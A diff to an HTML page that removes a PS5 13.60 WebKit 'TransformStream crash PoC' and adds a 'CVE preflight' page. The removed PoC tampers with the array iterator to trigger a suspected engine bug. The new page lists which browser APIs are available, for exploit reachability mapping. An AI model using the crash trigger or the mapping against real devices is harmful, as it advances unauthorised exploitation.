@@ -1,91 +1,231 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PS5 13.60 TransformStream crash PoC</title>
+<title>PS5 13.60 WebKit CVE Preflight</title>
 
-<pre id="status">READY</pre>
-<button onclick="control()">CONTROL</button>
-<button onclick="trigger()">TRIGGER</button>
+<style>
+body {
+    background:#101010;
+    color:#eee;
+    font:16px monospace;
+    padding:18px;
+}
+h2 { margin-bottom:6px; }
+button {
+    font:16px monospace;
+    padding:10px 16px;
+    margin-bottom:15px;
+}
+.pass { color:#7fff7f; }
+.fail { color:#ff8080; }
+.info { color:#ddd; }
+pre { white-space:pre-wrap; }
+</style>
+
+<h2>PS5 13.60 WebKit CVE Preflight</h2>
+<p>Capability / reachability mapping only</p>
+
+<button onclick="run()">RUN TESTS</button>
+<pre id="out">READY</pre>
 
 <script>
-const original = Array.prototype[Symbol.iterator];
+"use strict";
 
-function install(substitute) {
-    let call = 0;
+const out = document.querySelector("#out");
 
-    Array.prototype[Symbol.iterator] = function () {
-        const array = this;
-        const id = ++call;
-        const length = array.length;
-        let i = 0;
-
-        return {
-            next() {
-                if (i >= array.length)
-                    return { done: true };
-
-                let value = array[i];
-
-                // PS5 13.60:
-                // second iterator call has length 3.
-                if (
-                    substitute &&
-                    id === 2 &&
-                    length === 3 &&
-                    i === 1
-                ) {
-                    value = {};
-                }
-
-                i++;
-
-                return {
-                    done: false,
-                    value
-                };
-            }
-        };
-    };
+function line(s) {
+    out.textContent += s + "\n";
 }
 
-function control() {
-    document.querySelector("#status").textContent =
-        "CONTROL RUNNING";
+function exists(name, value) {
+    const ok = typeof value !== "undefined";
+    line((ok ? "[+] " : "[-] ") + name +
+         ": " + (ok ? typeof value : "UNAVAILABLE"));
+    return ok;
+}
 
-    install(false);
-
+function construct(name, fn) {
     try {
-        new TransformStream();
-
-        Array.prototype[Symbol.iterator] = original;
-
-        document.querySelector("#status").textContent =
-            "CONTROL: CONSTRUCTOR RETURNED";
-    } catch (e) {
-        Array.prototype[Symbol.iterator] = original;
-
-        document.querySelector("#status").textContent =
-            "CONTROL EXCEPTION: " + e;
+        const x = fn();
+        line("[+] " + name + ": CONSTRUCTOR OK");
+        return x;
+    } catch(e) {
+        line("[-] " + name + ": " +
+             e.name + ": " + e.message);
+        return null;
     }
 }
 
-function trigger() {
-    document.querySelector("#status").textContent =
-        "TRIGGER RUNNING";
+async function run() {
 
-    install(true);
+    out.textContent = "";
+
+    line("PS5 13.60 WEBKIT PREFLIGHT");
+    line("==========================");
+    line("");
+
+    line("STREAMS");
+    line("-------");
+
+    exists("ReadableStream", window.ReadableStream);
+    exists("WritableStream", window.WritableStream);
+    exists("TransformStream", window.TransformStream);
+
+    if (typeof TransformStream !== "undefined") {
+        construct("TransformStream", () =>
+            new TransformStream()
+        );
+    }
+
+    line("");
+    line("BUFFER / TYPED ARRAYS");
+    line("---------------------");
+
+    exists("ArrayBuffer", window.ArrayBuffer);
+    exists("DataView", window.DataView);
+    exists("Uint8Array", window.Uint8Array);
+    exists("BigInt64Array", window.BigInt64Array);
+    exists("SharedArrayBuffer", window.SharedArrayBuffer);
+
+    line("");
+    line("CLONING / TRANSFER");
+    line("------------------");
+
+    exists("structuredClone", window.structuredClone);
+    exists("MessageChannel", window.MessageChannel);
+    exists("BroadcastChannel", window.BroadcastChannel);
+    exists("Worker", window.Worker);
+
+    line("");
+    line("DOM LIFETIME");
+    line("------------");
+
+    exists("MutationObserver", window.MutationObserver);
+    exists("ResizeObserver", window.ResizeObserver);
+    exists("IntersectionObserver", window.IntersectionObserver);
+    exists("DOMParser", window.DOMParser);
+    exists("XMLSerializer", window.XMLSerializer);
+    exists("Range", window.Range);
+    exists("NodeIterator", window.NodeIterator);
+
+    line("");
+    line("RANGE");
 
     try {
-        new TransformStream();
+        const d = document.createElement("div");
+        d.innerHTML = "<b>x</b>";
 
-        Array.prototype[Symbol.iterator] = original;
+        const r = document.createRange();
+        r.selectNodeContents(d);
 
-        document.querySelector("#status").textContent =
-            "TRIGGER: CONSTRUCTOR RETURNED";
-    } catch (e) {
-        Array.prototype[Symbol.iterator] = original;
+        line("[+] Range creation: OK");
 
-        document.querySelector("#status").textContent =
-            "TRIGGER EXCEPTION: " + e;
+        if (typeof r.createContextualFragment === "function")
+            line("[+] createContextualFragment: AVAILABLE");
+        else
+            line("[-] createContextualFragment: UNAVAILABLE");
+
+    } catch(e) {
+        line("[-] Range test: " + e);
     }
+
+    line("");
+    line("SHADOW DOM");
+    line("----------");
+
+    try {
+        const d = document.createElement("div");
+
+        if (typeof d.attachShadow === "function") {
+            const root = d.attachShadow({mode:"open"});
+            line("[+] ShadowRoot: AVAILABLE");
+            line("[+] slot element: " +
+                 typeof document.createElement("slot"));
+        } else {
+            line("[-] ShadowRoot: UNAVAILABLE");
+        }
+    } catch(e) {
+        line("[-] ShadowRoot: " + e);
+    }
+
+    line("");
+    line("SVG / SMIL");
+    line("----------");
+
+    exists("SVGElement", window.SVGElement);
+    exists("SVGSVGElement", window.SVGSVGElement);
+    exists("SVGPathElement", window.SVGPathElement);
+    exists("SVGAnimationElement", window.SVGAnimationElement);
+
+    line("");
+    line("MEDIA");
+    line("-----");
+
+    exists("MediaSource", window.MediaSource);
+    exists("MediaRecorder", window.MediaRecorder);
+    exists("AudioContext",
+        window.AudioContext || window.webkitAudioContext);
+
+    line("");
+    line("CANVAS / GRAPHICS");
+    line("-----------------");
+
+    exists("ImageBitmap", window.ImageBitmap);
+    exists("OffscreenCanvas", window.OffscreenCanvas);
+    exists("WebGLRenderingContext",
+        window.WebGLRenderingContext);
+    exists("WebGL2RenderingContext",
+        window.WebGL2RenderingContext);
+
+    line("");
+    line("SECURITY / PARSING");
+    line("------------------");
+
+    exists("trustedTypes", window.trustedTypes);
+    exists("TrustedHTML", window.TrustedHTML);
+
+    line("");
+    line("UI APIs");
+    line("-------");
+
+    const pop = document.createElement("div");
+
+    line(
+        ("popover" in pop ? "[+] " : "[-] ") +
+        "Popover API: " +
+        ("popover" in pop ? "AVAILABLE" : "UNAVAILABLE")
+    );
+
+    const dialog = document.createElement("dialog");
+
+    line(
+        (typeof dialog.showModal === "function"
+            ? "[+] " : "[-] ") +
+        "Dialog API: " +
+        (typeof dialog.showModal === "function"
+            ? "AVAILABLE" : "UNAVAILABLE")
+    );
+
+    line("");
+    line("JAVASCRIPT ENGINE FEATURES");
+    line("--------------------------");
+
+    exists("Proxy", window.Proxy);
+    exists("WeakRef", window.WeakRef);
+    exists("FinalizationRegistry",
+        window.FinalizationRegistry);
+    exists("WebAssembly", window.WebAssembly);
+
+    line("");
+    line("HISTORY");
+    line("-------");
+
+    exists("history.pushState", history.pushState);
+    exists("history.replaceState", history.replaceState);
+
+    line("");
+    line("==========================");
+    line("PREFLIGHT COMPLETE");
+    line("==========================");
 }
+
 </script>
